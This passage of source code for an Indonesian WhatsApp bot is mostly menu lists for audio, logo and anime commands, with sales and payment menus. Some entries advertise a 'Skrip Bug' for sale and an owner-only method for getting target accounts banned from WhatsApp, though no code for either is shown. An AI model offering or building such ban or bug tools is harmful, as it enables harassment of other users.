  {title: `AUDIO 70`, rowId: `${prefix}sound70`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 71`, rowId: `${prefix}sound71`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 72`, rowId: `${prefix}sound72`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 73`, rowId: `${prefix}sound73`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 74`, rowId: `${prefix}sound74`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 75`, rowId: `${prefix}sound75`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 76`, rowId: `${prefix}sound76`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 77`, rowId: `${prefix}sound77`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 78`, rowId: `${prefix}sound78`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 79`, rowId: `${prefix}sound99`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 80`, rowId: `${prefix}sound80`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`},
{title: `AUDIO 81`, rowId: `${prefix}sound81`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 82`, rowId: `${prefix}sound82`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 83`, rowId: `${prefix}sound83`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 84`, rowId: `${prefix}sound84`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 85`, rowId: `${prefix}sound85`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 86`, rowId: `${prefix}sound86`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 87`, rowId: `${prefix}sound87`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 88`, rowId: `${prefix}sound88`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 89`, rowId: `${prefix}sound89`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 90`, rowId: `${prefix}sound90`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 91`, rowId: `${prefix}sound91`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 92`, rowId: `${prefix}sound92`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 93`, rowId: `${prefix}sound93`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 94`, rowId: `${prefix}sound94`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 95`, rowId: `${prefix}sound95`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 96`, rowId: `${prefix}sound96`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 97`, rowId: `${prefix}sound97`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 98`, rowId: `${prefix}sound98`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 99`, rowId: `${prefix}sound99`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 100`, rowId: `${prefix}sound100`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 101`, rowId: `${prefix}sound101`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 102`, rowId: `${prefix}sound102`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 103`, rowId: `${prefix}sound103`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 104`, rowId: `${prefix}sound104`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 105`, rowId: `${prefix}sound105`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 106`, rowId: `${prefix}sound106`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 107`, rowId: `${prefix}sound107`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 108`, rowId: `${prefix}sound108`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 109`, rowId: `${prefix}sound109`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 110`, rowId: `${prefix}sound110`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`},
{title: `AUDIO 111`, rowId: `${prefix}sound111`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 112`, rowId: `${prefix}sound113`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 114`, rowId: `${prefix}sound114`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 115`, rowId: `${prefix}sound115`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 116`, rowId: `${prefix}sound116`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 117`, rowId: `${prefix}sound117`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 118`, rowId: `${prefix}sound118`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 119`, rowId: `${prefix}sound119`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 120`, rowId: `${prefix}sound120`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 121`, rowId: `${prefix}sound121`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 122`, rowId: `${prefix}sound122`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 123`, rowId: `${prefix}sound123`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 124`, rowId: `${prefix}sound124`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 125`, rowId: `${prefix}sound125`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 126`, rowId: `${prefix}sound126`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 127`, rowId: `${prefix}sound127`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 128`, rowId: `${prefix}sound128`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 129`, rowId: `${prefix}sound129`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 130`, rowId: `${prefix}sound130`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 131`, rowId: `${prefix}sound131`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`},
{title: `AUDIO 132`, rowId: `${prefix}sound132`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 133`, rowId: `${prefix}sound133`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 134`, rowId: `${prefix}sound134`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 135`, rowId: `${prefix}sound135`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 136`, rowId: `${prefix}sound136`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 137`, rowId: `${prefix}sound137`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 138`, rowId: `${prefix}sound138`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 139`, rowId: `${prefix}sound139`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 140`, rowId: `${prefix}sound140`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 141`, rowId: `${prefix}sound141`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 142`, rowId: `${prefix}sound142`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 143`, rowId: `${prefix}sound143`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 144`, rowId: `${prefix}sound144`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 145`, rowId: `${prefix}sound145`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 146`, rowId: `${prefix}sound146`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 147`, rowId: `${prefix}sound147`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 148`, rowId: `${prefix}sound148`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 149`, rowId: `${prefix}sound149`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 150`, rowId: `${prefix}sound150`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 151`, rowId: `${prefix}sound151`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`},
{title: `AUDIO 152`, rowId: `${prefix}sound152`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 153`, rowId: `${prefix}sound153`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 154`, rowId: `${prefix}sound154`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 155`, rowId: `${prefix}sound155`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 156`, rowId: `${prefix}sound156`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 157`, rowId: `${prefix}sound157`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 158`, rowId: `${prefix}sound158`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 159`, rowId: `${prefix}sound159`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 160`, rowId: `${prefix}sound160`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 161`, rowId: `${prefix}sound161`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `}
]
}
]
haikal.sendListMsg(from, `
 Menyediakan Sound Gratis Untuk Kalian Mau
Total 161 Sound Dalam
161 Command, Dengan Audio Yang Berbeda 🤝

Thanks To
© Chem For Github Audio

Semoga Kalian Suka 🥳`, haikal.user.name, `Hay Kak Audio Ada Di List Yah`, `Click Here 🌷`, touchmebree, m)
break
case 'listlogo':
touchmebree = [
{
title: `©️ Xyrvzaa`,
rows: [
{title: `LOGO 1`, rowId: `${prefix}hw1`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `LOGO 2`, rowId: `${prefix}hw2`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 3`, rowId: `${prefix}hw3`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 4`, rowId: `${prefix}hw4`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 5`, rowId: `${prefix}hw5`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 6`, rowId: `${prefix}hw6`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 7`, rowId: `${prefix}hw7`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 8`, rowId: `${prefix}hw8`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 9`, rowId: `${prefix}hw9`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 10`, rowId: `${prefix}hw10`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 11`, rowId: `${prefix}hw11`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 12`, rowId: `${prefix}hw12`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 13`, rowId: `${prefix}hw13`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 14`, rowId: `${prefix}hw14`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 15`, rowId: `${prefix}hw15`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 16`, rowId: `${prefix}hw16`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 17`, rowId: `${prefix}hw17`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 18`, rowId: `${prefix}hw18`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 19`, rowId: `${prefix}hw19`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `LOGO 20`, rowId: `${prefix}hw20`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`},
{title: `LOGO 21`, rowId: `${prefix}hw21`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `LOGO 22`, rowId: `${prefix}hw22`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 23`, rowId: `${prefix}hw23`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 24`, rowId: `${prefix}hw24`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 25`, rowId: `${prefix}hw25`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 26`, rowId: `${prefix}hw26`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 27`, rowId: `${prefix}hw27`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 28`, rowId: `${prefix}hw28`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 29`, rowId: `${prefix}hw29`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 30`, rowId: `${prefix}hw30`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 31`, rowId: `${prefix}hw31`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 32`, rowId: `${prefix}hw32`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 33`, rowId: `${prefix}hw33`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 34`, rowId: `${prefix}hw34`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 35`, rowId: `${prefix}hw35`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 36`, rowId: `${prefix}hw36`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 37`, rowId: `${prefix}hw37`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 38`, rowId: `${prefix}hw38`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 39`, rowId: `${prefix}hw39`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `LOGO 40`, rowId: `${prefix}hw40`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`},
{title: `LOGO 41`, rowId: `${prefix}hw41`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `LOGO 42`, rowId: `${prefix}hw42`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 43`, rowId: `${prefix}hw43`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 44`, rowId: `${prefix}hw44`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 45`, rowId: `${prefix}hw45`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 46`, rowId: `${prefix}hw46`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 47`, rowId: `${prefix}hw47`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 48`, rowId: `${prefix}hw48`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 49`, rowId: `${prefix}hw49`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 50`, rowId: `${prefix}hw50`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 51`, rowId: `${prefix}hw51`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 52`, rowId: `${prefix}hw52`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 53`, rowId: `${prefix}hw53`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 54`, rowId: `${prefix}hw54`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 55`, rowId: `${prefix}hw55`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 56`, rowId: `${prefix}hw56`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 57`, rowId: `${prefix}hw57`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 58`, rowId: `${prefix}hw58`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 59`, rowId: `${prefix}hw59`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `LOGO 60`, rowId: `${prefix}hw60`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`},
{title: `LOGO 61`, rowId: `${prefix}hw61`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `LOGO 62`, rowId: `${prefix}hw62`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 63`, rowId: `${prefix}hw63`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 64`, rowId: `${prefix}hw64`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 65`, rowId: `${prefix}hw65`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 66`, rowId: `${prefix}hw66`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 67`, rowId: `${prefix}hw67`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 68`, rowId: `${prefix}hw68`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 69`, rowId: `${prefix}hw69`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 70`, rowId: `${prefix}hw70`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 71`, rowId: `${prefix}hw71`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 72`, rowId: `${prefix}hw72`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 73`, rowId: `${prefix}hw73`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 74`, rowId: `${prefix}hw74`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 75`, rowId: `${prefix}hw75`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 76`, rowId: `${prefix}hw76`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 77`, rowId: `${prefix}hw77`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 78`, rowId: `${prefix}hw78`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 79`, rowId: `${prefix}hw99`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `}
]
}
]
haikal.sendListMsg(from, `
 Menyediakan Logo Gratis Untuk Kalian Mau
Total 79 Gambar Dalam 
79 Command, Dengan Logo Yang Berbeda 🤝


Semoga Kalian Suka 🥳`, haikal.user.name, `Hay Kak Logo Picture Ada Di List Yah`, `Click Here 🌷`, touchmebree, m)
break

case 'listjualan': case 'jualan': {
touchmebree = [
{
title: `©️ Xyrvzaa`,
rows: [
{title: `🔏 PANEL AMGEEKZ`, rowId: `${prefix}panel`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `}, 
  {title: `🔏 Whatsapp 1`, rowId: `${prefix}hwcap3`, description: `com.whatsapp`},
  {title: `🔏 Whatsapp 2`, rowId: `${prefix}hwcap2`, description: `com.privatehwmods`},
   {title: `🔏 Whatsapp 3`, rowId: `${prefix}hwcap`, description: `com.hwmodswa`},
     {title: `🔏 Skrip Bug`, rowId: `${prefix}skrop2`, description: `skrip bug`},
   {title: `🔏 Skrip Store`, rowId: `${prefix}skrop1`, description: `skrip store`}
]
}
]
haikal.sendListMsg(from, `
LIST JUALAN AMGEEKZ `, haikal.user.name, `Sitting equally, there is no king or lord, because we live only Gods creation from a clod of soil`, `Click Here 🌷`, touchmebree, m)
}
break

case 'layanan':{
touchmebree = [
{
title: `©️ Xyrvzaa`,
rows: [
{title: `🔏 LARANGAN GROUP`, rowId: `${prefix}larangan`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `}, 
   {title: `🔏 PERINGATAN`, rowId: `${prefix}warning`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `🔏 INFORMASI AMGEEKZ`, rowId: `${prefix}infoamgeekz`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `🔏 TUTORIAL RUN BOT`, rowId: `${prefix}tutorial`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `🔏 TUTORIAL REGISTER`, rowId: `${prefix}redemcode`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `}
]
}
]
haikal.sendListMsg(from, `
 SYARAT KETENTUAN LAYANAN AMGEEKZ YANG BERLAKU`, haikal.user.name, `Sitting equally, there is no king or lord, because we live only Gods creation from a clod of soil`, `Click Here 🌷`, touchmebree, m)
}
break
case 'payment':{
touchmebree = [
{
title: `©️ Xyrvzaa`,
rows: [
{title: `DANA`, rowId: `${prefix}pdana`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `}, 
   {title: `GOPAY`, rowId: `${prefix}pgopay`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `REKENING BCA`, rowId: `${prefix}pbca`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `}
]
}
]
haikal.sendListMsg(from, `


*Pembayaran*

A/N
Deni Saputra

Semoga Kalian Suka 🥳`, haikal.user.name, `Hay Kak Pembayaran Ada Di List`, `Click Here 🌷`, touchmebree, m)
}
break
//=================================================//
case 'listwibu':
touchmebree = [
{
title: `©️ Xyrvzaa`,
rows: [
{title: `WIBU 1`, rowId: `${prefix}kill`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `WIBU 2`, rowId: `${prefix}pat`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 3`, rowId: `${prefix}lick`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 4`, rowId: `${prefix}yeet`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `WIBU 5`, rowId: `${prefix}bite`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 6`, rowId: `${prefix}wink`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `WIBU 7`, rowId: `${prefix}poke`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 8`, rowId: `${prefix}nom`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `WIBU 9`, rowId: `${prefix}slap`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 10`, rowId: `${prefix}smile`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `WIBU 11`, rowId: `${prefix}wave`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 12`, rowId: `${prefix}blush`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `WIBU 13`, rowId: `${prefix}smug`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 14`, rowId: `${prefix}glomp`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 15`, rowId: `${prefix}happy`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 16`, rowId: `${prefix}dance`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `WIBU 17`, rowId: `${prefix}cringe`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 18`, rowId: `${prefix}highfive`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `WIBU 19`, rowId: `${prefix}handhold`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `WIBU 20`, rowId: `${prefix}bonk`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`}
]
}
]
haikal.sendListMsg(from, `
 Menyediakan Gambar Gratis Untuk Kalian Mau
Total 300 Gambar Dalam 
20 Command, Dengan Picture Yang Berbeda 🤝


Semoga Kalian Suka 🥳`, haikal.user.name, `Hay Kak Wibu Picture Ada Di List Yah`, `Click Here 🌷`, touchmebree, m)
break
case 'listban':
if (!isCreator) return m.reply(mess.owner)
touchmebree = [
{
title: `©️ Xyrvzaa`,
rows: [
{title: `BANNED`, rowId: `${prefix}banned`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `UNBANED`, rowId: `${prefix}unbaned`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `RESET CODE`, rowId: `${prefix}resetverif`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `}
]
}
]
haikal.sendListMsg(from, `
Hii Guys Aku Menyediakan Methode Ban Menggunakan Gmail 🥳
Dan Ini Tidak Akan Selalu Tepat Sasaran Hanya Akan Berlaku Jika Si Target Memang Betul Telah Melukan Kesalahan Dalam Ketentuan layanan Komunitas WhatsApp

© WhatsApp LLC

Semoga Kalian Suka 🥳`, haikal.user.name, `Hay Kak List Ban Bot Ada Di List`, `Click Here 🌷`, touchmebree, m)
break
      case 'setadmin': {
      if (!isCreator) return m.reply(mess.owner)
        let setbot = global.db.data.settings[botNumber]
       if (args[0] === 'inod'){
setbot.inod = true
setbot.sura = false
setbot.hwmods = false
setbot.onkabeh = false
setbot.offkabeh = false
setbot.inod1 = false
setbot.sura1 = false
setbot.hwmods1 = false
setbot.onkabeh1 = false
setbot.offkabeh1 = false
m.reply('Success Coy')
} else if (args[0] === 'sura'){
setbot.inod = false
setbot.sura = true
setbot.hwmods = false
setbot.onkabeh = false
setbot.offkabeh = false
setbot.inod1 = false
setbot.sura1 = false
setbot.hwmods1 = false
setbot.onkabeh1 = false
setbot.offkabeh1 = false
m.reply('Success Coy')
} else if (args[0] === 'hwmods'){
setbot.inod = false
setbot.sura = false
setbot.hwmods = true
setbot.onkabeh = false
setbot.offkabeh = false
setbot.inod1 = false
setbot.sura1 = false
setbot.hwmods1 = false
setbot.onkabeh1 = false
setbot.offkabeh1 = false
m.reply('Success Coy')
} else if (args[0] === 'onkabeh'){
setbot.inod = false
setbot.sura = false
setbot.hwmods = false
setbot.onkabeh = true
setbot.offkabeh = false
setbot.inod1 = false
setbot.sura1 = false
setbot.hwmods1 = false
